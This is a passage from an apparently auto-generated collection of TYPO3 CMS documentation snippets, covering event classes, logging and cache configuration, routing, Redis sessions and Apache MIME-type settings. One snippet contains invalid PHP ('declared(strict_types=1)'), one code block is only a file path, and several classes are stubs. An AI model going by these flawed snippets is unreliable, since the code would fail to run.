https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkHandlersEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getLinkHandlers()\n    :returns: `array<string,array>`\n```\n\n----------------------------------------\n\nTITLE: Configuring RotatingFileWriter for Main Log File in TYPO3\nDESCRIPTION: Configuration for the RotatingFileWriter to enable log rotation for the main log file in TYPO3. This example configures daily rotation with a maximum of 14 files to be retained.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// Add log rotation for the main log file\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['writerConfiguration'][\\TYPO3\\CMS\\Core\\Log\\LogLevel::DEBUG][\\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class]['className'] =\n    \\TYPO3\\CMS\\Core\\Log\\Writer\\RotatingFileWriter::class;\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['writerConfiguration'][\\TYPO3\\CMS\\Core\\Log\\LogLevel::DEBUG][\\TYPO3\\CMS\\Core\\Log\\Writer\\RotatingFileWriter::class]['options'] = [\n    'interval' => 'daily',\n    'maxFiles' => 14,\n];\n```\n\n----------------------------------------\n\nTITLE: ModifyTreeDataEvent Class Definition - PHP\nDESCRIPTION: Class definition and methods for the ModifyTreeDataEvent that handles tree data modifications. Includes methods for getting and setting tree data and retrieving the provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/ModifyTreeDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Tree\\Event;\n\nclass ModifyTreeDataEvent {\n    public function getTreeData(): TYPO3\\CMS\\Backend\\Tree\\TreeNode;\n    public function setTreeData(TYPO3\\CMS\\Backend\\Tree\\TreeNode $treeData);\n    public function getProvider(): TYPO3\\CMS\\Core\\Tree\\TableConfiguration\\AbstractTableConfigurationTreeDataProvider;\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing TYPO3 CommentRepository Query Settings in PHP\nDESCRIPTION: Defines a CommentRepository class that initializes custom query settings to display comments from all pages by disabling storage page restrictions. The initializeObject method configures the default query settings to ignore storage page limitations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/DefaultQuerySettings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass CommentRepository extends Repository\n{\n    public function initializeObject(): void\n    {\n        $querySettings = $this->createQuery()->getQuerySettings();\n        // Show comments from all pages\n        $querySettings->setRespectStoragePage(false);\n        $this->setDefaultQuerySettings($querySettings);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Fluid Template for TYPO3 Backend Module\nDESCRIPTION: This code shows a complete Fluid template for a backend module action that includes namespaces, layout reference, and content section with translation for the module title.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModuleWithExtbase.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<html\n   xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\"\n   xmlns:core=\"http://typo3.org/ns/TYPO3/CMS/Core/ViewHelpers\"\n   xmlns:be=\"http://typo3.org/ns/TYPO3/CMS/Backend/ViewHelpers\"\n   data-namespace-typo3-fluid=\"true\">\n\n   <f:layout name=\"Default\" />\n\n   <f:section name=\"Content\">\n       <h1><f:translate key=\"backendUserListing\" /></h1>\n       ...\n   </f:section>\n\n</html>\n```\n\n----------------------------------------\n\nTITLE: Registering a RichText Editor Resolver in FormEngine for TYPO3 CMS in PHP\nDESCRIPTION: Example of registering a dynamic resolver for rich text editors in FormEngine. The resolver determines at runtime whether a specific text field should be rendered as a rich text editor based on TCA configuration and user settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\n// Register a node resolver to dynamically decide whether this is a job for ckeditor (priority 50)\n// or the rtehtmlarea (priority 40).\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['nodeResolver'][1433089350] = [\n    'nodeName' => 'text',\n    'priority' => 50,\n    'class' => \\TYPO3\\CMS\\RteCKEditor\\Form\\Resolver\\RichTextNodeResolver::class,\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring Feature Toggles in System Configuration\nDESCRIPTION: Shows how to manually set a feature toggle state in TYPO3's system configuration files. This allows administrators to enable or disable features without using the Install Tool.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['features']['myFeatureName'] = true;\n```\n\n----------------------------------------\n\nTITLE: Apache MIME Type Configuration\nDESCRIPTION: This code snippet shows how to configure MIME types in Apache using `AddType` directives. The issue is that these global settings may lead to unexpected MIME types being served for files with multiple extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FileExtensionHandling.rst#2025-04-16_snippet_0\n\nLANGUAGE: apacheconf\nCODE:\n```\nAddType text/html     html htm\nAddType image/svg+xml svg svgz\n```\n\n----------------------------------------\n\nTITLE: Disabling TYPO3 Extbase Reflection Cache for Development\nDESCRIPTION: Configuration example to disable the extbase_reflection cache by using the null backend. This is useful during development but should not be used in production as it will significantly decrease performance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Configuration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n// Disable extbase_reflection cache by using the null backend\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['extbase_reflection']['backend'] = \\TYPO3\\CMS\\Core\\Cache\\Backend\\NullBackend::class;\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Session Storage in TYPO3\nDESCRIPTION: Configuration for Redis session storage backend including connection settings for both frontend and backend users. Specifies hostname, password, database, and port settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/SessionStorage.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'SYS' => [\n    'session' => [\n        'BE' => [\n            'backend' => \\TYPO3\\CMS\\Core\\Session\\Backend\\RedisSessionBackend::class,\n            'options' => [\n                'hostname' => 'redis.myhost.example',\n                'password' => 'passw0rd',\n                'database' => 0,\n                'port' => 6379\n            ]\n        ],\n        'FE' => [\n            'backend' => \\TYPO3\\CMS\\Core\\Session\\Backend\\RedisSessionBackend::class,\n            'options' => [\n                'hostname' => 'redis.myhost.example',\n                'password' => 'passw0rd',\n                'database' => 0,\n                'port' => 6379\n            ]\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Extension Metadata with Composer\nDESCRIPTION: This JSON snippet configures the composer.json file for a TYPO3 extension. It includes the extension name, description, type, authors, homepage, support links, required PHP version and TYPO3 CMS dependencies, autoloading configuration, and extra settings specifically for TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/ComposerJsonSimplified.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\n   {\n       \"name\": \"ttn/tea\",\n       \"description\": \"TYPO3 example extension for unit testing and best practices\",\n       \"type\": \"typo3-cms-extension\",\n       \"authors\": [\n           {\n               \"name\": \"Oliver Klee\",\n               \"email\": \"typo3-coding@oliverklee.de\",\n               \"homepage\": \"https://www.oliverklee.de\",\n               \"role\": \"maintainer\"\n           },\n           {\n               \"name\": \"Daniel Siepmann\",\n               \"email\": \"coding@daniel-siepmann.de\",\n               \"homepage\": \"https://daniel-siepmann.de/\",\n               \"role\": \"maintainer\"\n           },\n           {\n               \"name\": \"\\u0141ukasz Uzna\\u0144ski\",\n               \"email\": \"lukaszuznanski94@gmail.com\",\n               \"homepage\": \"https://uznanski.pl/\",\n               \"role\": \"maintainer\"\n           }\n       ],\n       \"homepage\": \"https://extensions.typo3.org/extension/tea/\",\n       \"support\": {\n           \"issues\": \"https://github.com/FriendsOfTYPO3/tea/issues\",\n           \"source\": \"https://github.com/FriendsOfTYPO3/tea\",\n           \"docs\": \"https://docs.typo3.org/p/ttn/tea/main/en-us/\"\n       },\n       \"require\": {\n           \"php\": \"~7.4.0 || ~8.0.0 || ~8.1.0 || ~8.2.0 || ~8.3.0\",\n           \"psr/http-message\": \"^1.0.1\",\n           \"typo3/cms-core\": \"^11.5.4 || ^12.4\",\n           \"typo3/cms-extbase\": \"^11.5.4 || ^12.4\",\n           \"typo3/cms-fluid\": \"^11.5.4 || ^12.4\",\n           \"typo3/cms-frontend\": \"^11.5.4 || ^12.4\"\n       },\n       \"prefer-stable\": true,\n       \"autoload\": {\n           \"psr-4\": {\n               \"TTN\\\\Tea\\\\\": \"Classes/\"\n           }\n       },\n       \"extra\": {\n           \"typo3/cms\": {\n               \"extension-key\": \"tea\"\n           }\n       }\n   }\n   \n```\n\n----------------------------------------\n\nTITLE: Configuring RecordLinkHandler Display in TypoScript\nDESCRIPTION: This TypoScript configuration shows how to set up the display of links created by the RecordLinkHandler in the frontend. It includes options for forcing links and setting up typolink parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/RecordLinkHandler.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.anIdentifier {\n    // Do not force link generation when the record is hidden\n    forceLink = 0\n    typolink {\n        parameter = 123\n        additionalParams.data = field:uid\n        additionalParams.wrap = &tx_example_pi1[item]=|&tx_example_pi1[controller]=Item&tx_example_pi1[action]=show\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring DpnGlossary Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the DpnGlossary extension, including list view and detail view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  DpnGlossary:\n    type: Extbase\n    extension: DpnGlossary\n    plugin: glossary\n    routes:\n      - routePath: '/'\n        _controller: 'Term::list'\n      - routePath: '/term/{term}'\n        _controller: 'Term::show'\n        _arguments:\n          term: term\n    defaultController: 'Term::list'\n    aspects:\n      term:\n        type: PersistedAliasMapper\n        tableName: tx_dpnglossary_domain_model_term\n        routeFieldName: slug\n      character:\n        type: StaticMultiRangeMapper\n        ranges:\n          - start: 'a'\n            end: 'z'\n          - start: '0'\n            end: '9'\n```\n\n----------------------------------------\n\nTITLE: Building a TYPO3 Backend URI for Record Creation in PHP\nDESCRIPTION: This method creates a link to the record_edit route for creating a new Haiku entry. It demonstrates how to structure parameters for record editing, including default values and column limitations, then builds a URI using the backendUriBuilder service.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/_UriBuilder/_CreateHaikuLinkPhp.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\UriInterface;\n\nclass ModuleController extends ActionController\n{\n    protected function getCreateHaikuLink(string $returnUrl): UriInterface\n    {\n        $uriParameters =\n            [\n                'edit' => [\n                    'tx_examples_haiku' => [\n                        1 => 'new',\n                    ],\n                ],\n                'defVals' => [\n                    'tx_examples_haiku' => [\n                        'title' => 'New Haiku?',\n                        'season' => 'Spring',\n                    ],\n                ],\n                'columnsOnly' => [\n                    'tx_examples_haiku' => [\n                        'title',\n                        'season',\n                        'color',\n                    ],\n                ],\n                'returnUrl' => $returnUrl,\n            ];\n        return $this->backendUriBuilder->buildUriFromRoute(\n            'record_edit',\n            $uriParameters,\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeResourceStorageInitializationEvent Class in PHP\nDESCRIPTION: This snippet defines the BeforeResourceStorageInitializationEvent class with methods for getting and setting storage UID, record, and file identifier. It's used to modify resource data before storage initialization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeResourceStorageInitializationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeResourceStorageInitializationEvent\n{\n    public function getStorageUid(): int\n    {\n        // Implementation not shown\n    }\n\n    public function setStorageUid(int $storageUid): void\n    {\n        // Implementation not shown\n    }\n\n    public function getRecord(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setRecord(array $record): void\n    {\n        // Implementation not shown\n    }\n\n    public function getFileIdentifier(): ?string\n    {\n        // Implementation not shown\n    }\n\n    public function setFileIdentifier(?string $fileIdentifier): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache MIME Type Configuration with FilesMatch\nDESCRIPTION: This code snippet demonstrates how to limit MIME type assignments using `<FilesMatch>` in Apache. This ensures that MIME types are assigned correctly based on the last extension and prevents misinterpretation of file types with multiple extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FileExtensionHandling.rst#2025-04-16_snippet_1\n\nLANGUAGE: apacheconf\nCODE:\n```\n<FilesMatch \".+\\\\.html?$\">\n    AddType text/html     .html .htm\n</FilesMatch>\n<FilesMatch \".+\\\\.svgz?$\">\n    AddType image/svg+xml .svg .svgz\n</FilesMatch>\n```\n\n----------------------------------------\n\nTITLE: Implementing AvailableActionsForExtensionEvent in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates the API for the AvailableActionsForExtensionEvent class in TYPO3 CMS. It shows the class definition, constructor, and available methods for managing extension actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/ExtensionManager/AvailableActionsForExtensionEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AvailableActionsForExtensionEvent\n{\n    public function __construct(\n        private readonly string $extensionKey,\n        private array $actions\n    ) {\n    }\n\n    public function getExtensionKey(): string\n    {\n        return $this->extensionKey;\n    }\n\n    public function getActions(): array\n    {\n        return $this->actions;\n    }\n\n    public function setActions(array $actions): void\n    {\n        $this->actions = $actions;\n    }\n\n    public function addAction(string $identifier, array $action): void\n    {\n        $this->actions[$identifier] = $action;\n    }\n\n    public function removeAction(string $identifier): void\n    {\n        unset($this->actions[$identifier]);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ModuleTemplate Objects with ModuleTemplateFactory in TYPO3 CMS Backend\nDESCRIPTION: The ModuleTemplateFactory class is responsible for creating ModuleTemplate view objects for the TYPO3 backend. It provides a create method that accepts a ServerRequestInterface object and returns a ModuleTemplate instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/_ModuleTemplateFactory.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Template;\n\nclass ModuleTemplateFactory\n{\n    public function create(\\Psr\\Http\\Message\\ServerRequestInterface $request): \\TYPO3\\CMS\\Backend\\Template\\ModuleTemplate\n    {\n        // Implementation not shown in the snippet\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining PreviewRendererInterface for TYPO3 Backend\nDESCRIPTION: Interface declaration for rendering record previews in TYPO3 backend. Contains methods for rendering preview header, content, footer and wrapping functionality. Used in the page module to display record previews.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/PreviewRendererInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ninterface PreviewRendererInterface {\n    public function renderPageModulePreviewHeader(\\TYPO3\\CMS\\Backend\\View\\BackendLayout\\Grid\\GridColumnItem $item): string;\n    \n    public function renderPageModulePreviewContent(\\TYPO3\\CMS\\Backend\\View\\BackendLayout\\Grid\\GridColumnItem $item): string;\n    \n    public function renderPageModulePreviewFooter(\\TYPO3\\CMS\\Backend\\View\\BackendLayout\\Grid\\GridColumnItem $item): string;\n    \n    public function wrapPageModulePreview(string $previewHeader, string $previewContent, \\TYPO3\\CMS\\Backend\\View\\BackendLayout\\Grid\\GridColumnItem $item): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Sending POST Request with JSON Payload in TYPO3 (JavaScript)\nDESCRIPTION: Shows how to send a POST request with a JSON payload using the TYPO3 Ajax API. It sets the Content-Type header to application/json and sends the request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/AjaxRequest/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst request = new AjaxRequest('https://example.org/api/endpoint');\nconst promise = request.post(\n  { some: 'payload' },\n  {\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  }\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Crowdin Integration for TYPO3 Extension\nDESCRIPTION: This YAML configuration file specifies how Crowdin should handle the translation files for a TYPO3 extension. It preserves the file hierarchy, defines the source and translation file patterns, and sets up ignore rules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin/ExtensionIntegration.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npreserve_hierarchy: 1\nfiles:\n  - source: /Resources/Private/Language/*.xlf\n    translation: /%original_path%/%two_letters_code%.%original_file_name%\n    ignore:\n      - /**/%two_letters_code%.%original_file_name%\n```\n\n----------------------------------------\n\nTITLE: Using Feature Toggles in Fluid Templates\nDESCRIPTION: Shows how to use the Feature ViewHelper in Fluid templates to conditionally render content based on a feature toggle's state. The content will only be rendered if the specified feature is enabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<f:feature name=\"unifiedPageTranslationHandling\">\n   This is being shown if the flag is enabled\n</f:feature>\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom ViewHelper by Extending AbstractViewHelper\nDESCRIPTION: Implementation of a custom Gravatar ViewHelper that extends AbstractViewHelper. This example shows how to define arguments, disable output escaping, and render a Gravatar image based on an email address with proper security measures.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\ViewHelpers;\n\nuse TYPO3Fluid\\Fluid\\Core\\ViewHelper\\AbstractViewHelper;\n\n// Example 1: GravatarViewHelper without TagBuilder\nclass GravatarViewHelper extends AbstractViewHelper\n{\n    protected $escapeOutput = false;\n\n    public function initializeArguments(): void\n    {\n        $this->registerArgument(\n            'emailAddress',\n            'string',\n            'The email address to resolve the gravatar for',\n            true\n        );\n        $this->registerArgument(\n            'alt',\n            'string',\n            'Alternative text',\n            false,\n            ''\n        );\n    }\n\n    public function render(): string\n    {\n        $emailAddress = $this->arguments['emailAddress'];\n        $alt = $this->arguments['alt'] ?? '';\n\n        $gravatarUri = 'https://www.gravatar.com/avatar/'\n            . md5(strtolower(trim($emailAddress)))\n            . '?d=identicon';\n\n        return '<img src=\"' . $gravatarUri . '\" alt=\"'\n            . htmlspecialchars($alt) . '\" />';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced File Search with Restrictions in TYPO3 - PHP\nDESCRIPTION: Example of implementing advanced file search with additional restrictions using FileSearchDemand in TYPO3. Shows how to chain methods for adding multiple search criteria.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileSearch.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n_ExamplesFileSearch/_SearchInStorageWithRestrictions.php\n```\n\n----------------------------------------\n\nTITLE: Configuring CSP with SHA256 hash in YAML\nDESCRIPTION: Example of configuring Content Security Policy using SHA256 hash for script validation in YAML.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n#...\n- mode: \"extend\"\n  directive: \"script-src\"\n  sources:\n    - \"sha256-6c7d3c1bf856597a2c8ae2ca7498cb4454a32286670b20cf36202fa578b491a9\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Mail Template Paths in PHP\nDESCRIPTION: Sets custom template and layout root paths for email templates in TYPO3 by adding them to the TYPO3_CONF_VARS configuration array with a high priority index.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['templateRootPaths'][700]\n    = 'EXT:my_site_package/Resources/Private/Templates/Email';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['layoutRootPaths'][700]\n    = 'EXT:my_site_extension/Resources/Private/Layouts';\n```\n\n----------------------------------------\n\nTITLE: Creating Page Title Provider Using Site Configuration in PHP\nDESCRIPTION: Example of a page title provider that uses data from the site configuration, such as the site title, to set the page title.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/PageTitleApi.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MySitePackage\\PageTitle;\n\nuse TYPO3\\CMS\\Core\\PageTitle\\AbstractPageTitleProvider;\nuse TYPO3\\CMS\\Core\\Site\\SiteFinder;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nclass WebsiteTitleProvider extends AbstractPageTitleProvider\n{\n    public function __construct(\n        private readonly SiteFinder $siteFinder,\n    ) {}\n\n    public function getTitle(): string\n    {\n        $request = $GLOBALS['TYPO3_REQUEST'];\n        $pageInformation = $request->getAttribute('frontend.page.information');\n        $site = $this->siteFinder->getSiteByPageId($pageInformation->getId());\n        $configuration = $site->getConfiguration();\n        $websiteTitle = $configuration['websiteTitle'] ?? '';\n\n        return sprintf('%s - %s', $this->getPageTitle(), $websiteTitle);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AdminModuleController for TYPO3 CMS Backend in PHP\nDESCRIPTION: This code snippet defines an AdminModuleController class with a private method setUpDocHeader. The method configures the document header for a TYPO3 backend module, creating a link button and adding it to the button bar. It requires various TYPO3 core dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_AdminModuleControllerSetUpDocHeader.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Template\\Components\\ButtonBar;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\nuse TYPO3\\CMS\\Core\\Imaging\\IconSize;\n\nfinal readonly class AdminModuleController\n{\n    private function setUpDocHeader(\n        ServerRequestInterface $request,\n        ModuleTemplate $view,\n    ): void {\n        $buttonBar = $view->getDocHeaderComponent()->getButtonBar();\n        $uriBuilderPath = $this->uriBuilder->buildUriFromRoute('web_list', ['id' => 0]);\n        $list = $buttonBar->makeLinkButton()\n            ->setHref($uriBuilderPath)\n            ->setTitle('A Title')\n            ->setShowLabelText(true)\n            ->setIcon($this->iconFactory->getIcon('actions-extension-import', IconSize::SMALL->value));\n        $buttonBar->addButton($list, ButtonBar::BUTTON_POSITION_LEFT, 1);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Admin Module Controller with PSR-7 Request Handling\nDESCRIPTION: Class that handles admin module requests in TYPO3 CMS. It processes module data, sets up the document header, and routes to different actions based on the function parameter. Uses PSR-7 interfaces for request/response handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_AdminModuleControllerHandleRequest.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nfinal readonly class AdminModuleController\n{\n    public function handleRequest(ServerRequestInterface $request): ResponseInterface\n    {\n        $languageService = $this->getLanguageService();\n\n        $allowedOptions = [\n            'function' => [\n                'debug' => htmlspecialchars(\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:debug'),\n                ),\n                'password' => htmlspecialchars(\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:password'),\n                ),\n                'index' => htmlspecialchars(\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:index'),\n                ),\n            ],\n        ];\n\n        $moduleData = $request->getAttribute('moduleData');\n        if ($moduleData->cleanUp($allowedOptions)) {\n            $this->getBackendUser()->pushModuleData($moduleData->getModuleIdentifier(), $moduleData->toArray());\n        }\n\n        $moduleTemplate = $this->moduleTemplateFactory->create($request);\n        $this->setUpDocHeader($request, $moduleTemplate);\n\n        $title = $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang_mod.xlf:mlang_tabs_tab');\n        switch ($moduleData->get('function')) {\n            case 'debug':\n                $moduleTemplate->setTitle(\n                    $title,\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:module.menu.debug'),\n                );\n                return $this->debugAction($request, $moduleTemplate);\n            case 'password':\n                $moduleTemplate->setTitle(\n                    $title,\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:module.menu.password'),\n                );\n                return $this->passwordAction($request, $moduleTemplate);\n            default:\n                $moduleTemplate->setTitle(\n                    $title,\n                    $languageService->sL('LLL:EXT:examples/Resources/Private/Language/AdminModule/locallang.xlf:module.menu.log'),\n                );\n                return $this->indexAction($request, $moduleTemplate);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring File Upload Properties in Extbase Controller\nDESCRIPTION: This code block demonstrates how to manually configure file upload settings in an Extbase controller using the initialize*Action method for more control over file validation, allowed mime types, upload location, and more.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\npublic function initializeCreateAction(): void\n{\n    $mimeTypeValidator = GeneralUtility::makeInstance(MimeTypeValidator::class);\n    $mimeTypeValidator->setOptions(['allowedMimeTypes' => ['image/jpeg']]);\n\n    $fileHandlingServiceConfiguration = $this->arguments->getArgument('myArgument')->getFileHandlingServiceConfiguration();\n    $fileHandlingServiceConfiguration->addFileUploadConfiguration(\n        (new FileUploadConfiguration('myPropertyName'))\n            ->setRequired()\n            ->addValidator($mimeTypeValidator)\n            ->setMaxFiles(1)\n            ->setUploadFolder('1:/user_upload/files/')\n    );\n\n    $this->arguments->getArgument('myArgument')->getPropertyMappingConfiguration()->skipProperties('myPropertyName');\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing User TSconfig in TYPO3\nDESCRIPTION: Retrieves TSconfig settings for the current backend user, specifically the 'options.clipboardNumberPads' value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$tsconfig = $GLOBALS['BE_USER']->getTSConfig();\n$clipboardNumberPads = $tsconfig['options.']['clipboardNumberPads'] ?? '';\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Event Listener for BeforeRedirectMatchDomainEvent in TYPO3\nDESCRIPTION: Example of an event listener that implements custom redirect matching logic. The listener checks if a page exists for a specific site and language, and if found, sets it as a matched redirect with statusCode 307.\nSOURCE: 